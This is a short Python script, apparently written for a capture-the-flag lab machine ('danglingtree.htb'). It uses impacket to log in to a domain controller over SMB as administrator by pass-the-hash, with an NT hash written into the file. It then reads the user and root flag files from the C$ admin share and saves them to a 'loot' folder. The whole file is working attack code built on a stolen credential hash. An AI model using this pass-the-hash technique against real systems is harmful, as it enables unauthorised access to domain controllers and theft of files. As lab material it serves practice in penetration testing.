#!/usr/bin/env python3
"""Read user.txt / root.txt from DC using Administrator NT hash (or cache).

Usage:
  python3 get_flags.py
  python3 get_flags.py --nthash 8cacb3a97e460c65d105ca7cd9913925
"""
from __future__ import annotations

import argparse
import io
import os
import sys
from pathlib import Path

from impacket.smbconnection import SMBConnection

DEFAULT_HASH = os.environ.get(
    "ADMIN_NTHASH", "8cacb3a97e460c65d105ca7cd9913925"
)
LM = "aad3b435b51404eeaad3b435b51404ee"
DC = os.environ.get("DC_IP", "10.129.6.118")
DOMAIN = "danglingtree.htb"


def read_file(s: SMBConnection, share: str, path: str) -> bytes:
    buf = io.BytesIO()
    s.getFile(share, path, buf.write)
    return buf.getvalue()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--dc-ip", default=DC)
    ap.add_argument("--nthash", default=DEFAULT_HASH)
    ap.add_argument("--out", type=Path, default=Path(__file__).resolve().parent.parent / "loot")
    args = ap.parse_args()
    args.out.mkdir(parents=True, exist_ok=True)

    s = SMBConnection("dc.danglingtree.htb", args.dc_ip, timeout=20)
    s.login(
        "administrator",
        "",
        DOMAIN,
        lmhash=LM,
        nthash=args.nthash,
    )
    print("[+] SMB as administrator OK")

    paths = {
        "root": r"Users\Administrator\Desktop\root.txt",
        "user": r"Users\noah.b\Desktop\user.txt",
    }
    for name, path in paths.items():
        try:
            data = read_file(s, "C$", path)
            text = data.decode(errors="replace").strip()
            print(f"[+] {name}.txt = {text}")
            (args.out / f"{name}.txt").write_text(text + "\n")
        except Exception as e:
            print(f"[-] {name}: {e}", file=sys.stderr)

    s.logoff()
    return 0


if __name__ == "__main__":
    sys.exit(main())
